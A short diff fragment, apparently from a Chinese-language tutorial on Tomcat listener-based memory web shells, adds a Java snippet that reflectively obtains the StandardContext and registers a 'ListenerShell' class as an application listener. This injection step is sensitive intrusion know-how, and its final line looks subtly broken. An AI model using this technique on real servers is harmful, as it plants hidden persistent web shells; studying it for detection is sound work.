@@ -203,3 +203,13 @@ public class ListenerShell implements ServletRequestListener {
 
 获取standardcontext并`getApplicationEventListeners()`
 
+```java
+Field reqField = request.getClass().getDeclaredField("request");  
+reqField.setAccessible(true);  
+Request req = (Request) reqField.get(request);  
+StandardContext context = (StandardContext) req.getContext();  
+context.fireRequestInitEvent(req.getRequest());  
+ListenerShell listenerShell = new ListenerShell();  
+context.addApplicationListener(String.valueOf(listenerShell));
+```
+
